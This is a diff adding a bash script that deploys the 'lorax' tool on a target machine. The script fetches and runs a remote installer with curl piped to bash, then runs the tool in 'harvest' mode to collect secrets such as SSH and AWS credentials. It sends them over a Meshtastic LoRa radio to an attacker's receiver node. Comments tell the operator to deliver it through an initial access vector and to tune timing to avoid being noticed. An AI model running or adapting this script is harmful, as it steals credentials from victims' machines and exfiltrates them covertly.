@@ -1,0 +1,40 @@
+#!/usr/bin/env bash
+# Per-engagement harvest script — keep private, do NOT commit with real values.
+# Copy this file, fill in the variables below, then host it somewhere you control
+# (private gist, your own server, etc.) or deliver it via your initial access vector.
+#
+# One-liner on the target (replace URL with wherever you host this script):
+#   bash <(curl -s http://YOUR_SERVER/deploy.sh)
+
+# -----------------------------------------------------------------------
+# Engagement-specific values — fill these in
+# -----------------------------------------------------------------------
+RADIO="192.168.0.100"          # IP of victim's Meshtastic node (TCP) or 'serial'
+DEST="!YOUR_NODE_ID"               # Attacker receiver node ID
+PUBKEY=""                      # Receiver public key from: lorax --mode recv
+                               # Leave blank to skip E2E encryption (channel PSK only)
+DELAY=10                       # Seconds between chunks — lower = faster but riskier
+HARVEST_ONLY=""                # Comma-separated categories, e.g. ssh,aws — blank = all
+# -----------------------------------------------------------------------
+
+set -e
+
+# Pull and stage the LORAX binary
+bash <(curl -s https://raw.githubusercontent.com/Zetascrub/LoraX/main/install.sh)
+
+# Locate it (install.sh writes to /tmp/lorax or ~/.lorax)
+if [ -x /tmp/lorax ]; then
+    BIN=/tmp/lorax
+elif [ -x "$HOME/.lorax" ]; then
+    BIN="$HOME/.lorax"
+else
+    echo "[-] lorax binary not found after install" >&2
+    exit 1
+fi
+
+# Build the harvest command
+ARGS="--mode harvest --radio $RADIO --dest $DEST --delay $DELAY"
+[ -n "$PUBKEY" ]        && ARGS="$ARGS --pubkey $PUBKEY"
+[ -n "$HARVEST_ONLY" ]  && ARGS="$ARGS --harvest-only $HARVEST_ONLY"
+
+exec "$BIN" $ARGS
